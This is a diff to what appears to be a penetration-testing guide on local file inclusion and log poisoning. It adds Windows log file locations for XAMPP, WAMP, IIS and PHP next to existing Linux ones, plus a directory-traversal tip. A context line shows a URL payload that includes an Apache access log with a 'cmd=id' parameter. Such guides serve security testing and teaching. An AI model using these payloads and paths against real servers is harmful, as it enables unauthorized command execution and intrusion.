@@ -142,27 +142,56 @@ http://target/index.php?page=/var/log/apache2/access.log&cmd=id
 
 #### Common Log Locations
 
+#### Linux
+
 **Apache:**
 
-```bash
+```
 /var/log/apache2/access.log
 /var/log/apache2/error.log
 ```
 
 **Nginx:**
 
-```bash
+```
 /var/log/nginx/access.log
 /var/log/nginx/error.log
 ```
 
 **Other logs:**
 
-```bash
+```
 /var/log/php_errors.log
 /var/log/sshd.log
 /var/log/vsftpd.log
 ```
+
+
+#### Windows
+> Using excessive `../` in LFI will traverse up to the filesystem root (e.g., `C:\`), making it unnecessary to specify the drive letter explicitly.
+
+**Apache (XAMPP/WAMP):**
+
+```
+C:\xampp\apache\logs\access.log
+C:\xampp\apache\logs\error.log
+
+C:\wamp\logs\access.log
+C:\wamp\logs\error.log
+```
+
+**IIS:**
+
+```
+C:\inetpub\logs\LogFiles\W3SVC1\u_ex*.log
+```
+
+**PHP logs:**
+
+```
+C:\xampp\php\logs\php_error_log
+```
+
 
 
 ### PHP Session Poisoning
